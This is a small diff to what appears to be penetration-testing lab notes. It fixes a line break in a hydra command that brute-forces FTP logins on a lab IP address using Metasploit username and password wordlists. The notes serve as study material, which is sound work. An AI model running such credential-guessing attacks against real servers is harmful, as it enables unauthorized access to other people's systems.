@@ -55,8 +55,7 @@ ftp 192.217.238.3
 - Use `hydra` with some users/passwords word lists to check if any credentials work with the ftp server 
 
 ```bash
-hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/da
-ta/wordlists/unix_passwords.txt 192.217.238.3 -t 4 ftp
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.217.238.3 -t 4 ftp
 ```
 
 ```bash
